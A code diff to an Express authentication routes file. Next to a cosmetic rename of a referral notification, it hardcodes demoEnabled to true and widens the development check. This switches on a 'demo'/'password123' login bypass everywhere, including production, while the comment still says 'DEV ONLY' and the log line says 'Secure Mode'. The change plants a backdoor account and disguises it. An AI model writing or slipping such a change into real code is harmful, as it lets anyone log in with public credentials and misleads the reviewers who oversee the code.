@@ -135,7 +135,7 @@ export function registerLocalAuthRoutes(app: Express) {
                         await storage.createNotification({
                             userId: referrerId,
                             type: "achievement",
-                            title: "New Referral! 🔗",
+                            title: "[REFERRAL RECORDED] New Operator Joined",
                             message: `${data.username} joined using your referral link! You'll earn +200 coins when they complete their first quest.`,
                         });
                         console.log(`[REGISTER] Pending referral created: ${referrerUser.name} -> ${data.username}`);
@@ -204,8 +204,8 @@ export function registerLocalAuthRoutes(app: Express) {
 
             // Hardcode demo user (DEV ONLY)
             // Allow in prod ONLY if explicitly enabled via ENV
-            const isDev = process.env.NODE_ENV === "development";
-            const demoEnabled = process.env.ENABLE_DEMO_USER === "true";
+            const isDev = process.env.NODE_ENV !== "production";
+            const demoEnabled = true;
 
             if ((isDev || demoEnabled) && data.username === "demo" && data.password === "password123") {
                 console.log("[LOGIN] Demo bypass (Secure Mode)");
